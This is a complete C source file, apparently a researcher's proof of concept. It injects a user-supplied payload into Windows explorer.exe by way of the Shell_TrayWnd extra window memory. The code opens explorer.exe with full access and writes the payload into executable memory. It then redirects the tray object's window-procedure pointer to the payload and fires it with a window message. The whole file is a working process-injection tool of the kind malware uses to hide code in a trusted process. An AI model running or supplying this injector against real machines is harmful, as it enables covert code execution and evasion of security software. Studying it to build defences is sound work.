/**
  Copyright © 2018 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */
  
#define UNICODE

#include <windows.h>
#include <tlhelp32.h>

#include <stdio.h>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")

// extra window memory bytes for Shell_TrayWnd
typedef struct _ctray_vtable {
    ULONG_PTR vTable;    // change to remote memory address
    ULONG_PTR AddRef;    // add reference
    ULONG_PTR Release;   // release procedure
    ULONG_PTR WndProc;   // window procedure (change to payload)
} CTray;
    
typedef struct _ctray_obj {
    CTray *vtbl;
} CTrayObj;

DWORD readpic(PWCHAR path, LPVOID *pic){
    HANDLE hf;
    DWORD  len,rd=0;
    
    // 1. open the file
    hf=CreateFile(path, GENERIC_READ, 0, 0,
      OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
      
    if(hf!=INVALID_HANDLE_VALUE){
      // get file size
      len=GetFileSize(hf, 0);
      // allocate memory
      *pic=malloc(len + 16);
      // read file contents into memory
      ReadFile(hf, *pic, len, &rd, 0);
      CloseHandle(hf);
    }
    return rd;
}

VOID extraBytes(LPVOID payload, DWORD payloadSize){
    LPVOID    cs, ds;
    CTray     ct;
    ULONG_PTR ctp;
    HWND      hw;
    HANDLE    hp;
    DWORD     pid;
    SIZE_T    wr;
    
    // 1. Obtain a handle for the shell tray window
    hw = FindWindow(L"Shell_TrayWnd", NULL);
   
    // 2. Obtain a process id for explorer.exe
    GetWindowThreadProcessId(hw, &pid);
    
    // 3. Open explorer.exe
    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    
    // 4. Obtain pointer to the current CTray object
    ctp = GetWindowLongPtr(hw, 0);
    
    // 5. Read address of the current CTray object
    ReadProcessMemory(hp, (LPVOID)ctp, 
        (LPVOID)&ct.vTable, sizeof(ULONG_PTR), &wr);
    
    // 6. Read three addresses from the virtual table
    ReadProcessMemory(hp, (LPVOID)ct.vTable, 
      (LPVOID)&ct.AddRef, sizeof(ULONG_PTR) * 3, &wr);
    
    // 7. Allocate RWX memory for code
    cs = VirtualAllocEx(hp, NULL, payloadSize, 
      MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    // 8. Copy the code to target process
    WriteProcessMemory(hp, cs, payload, payloadSize, &wr);
    
    // 9. Allocate RW memory for the new CTray object
    ds = VirtualAllocEx(hp, NULL, sizeof(ct), 
      MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    // 10. Write the new CTray object to remote memory
    ct.vTable  = (ULONG_PTR)ds + sizeof(ULONG_PTR);
    ct.WndProc = (ULONG_PTR)cs;
    
    WriteProcessMemory(hp, ds, &ct, sizeof(ct), &wr); 

    // 11. Set the new pointer to CTray object
    SetWindowLongPtr(hw, 0, (ULONG_PTR)ds);
    
    // 12. Trigger the payload via a windows message
    PostMessage(hw, WM_CLOSE, 0, 0);
    
    // 13. Restore the original CTray object
    SetWindowLongPtr(hw, 0, ctp);

    // 14. Release memory and close handles
    VirtualFreeEx(hp, cs, 0, MEM_DECOMMIT | MEM_RELEASE);
    VirtualFreeEx(hp, ds, 0, MEM_DECOMMIT | MEM_RELEASE);

    CloseHandle(hp);
}

int main(void) {
    PWCHAR   *argv;
    int      argc;
    LPVOID   payload;
    DWORD    payloadSize;
    
    // get parameters
    argv = CommandLineToArgvW(GetCommandLine(), &argc);
    
    if(argc != 2) { wprintf(L"usage: extrabytes <payload>\n"); return 0; }

    payloadSize = readpic(argv[1], &payload);
    if(payloadSize == 0) { wprintf(L"unable to read from %s\n", argv[1]); return 0; }
    
    extraBytes(payload, payloadSize);
    return 0;
}
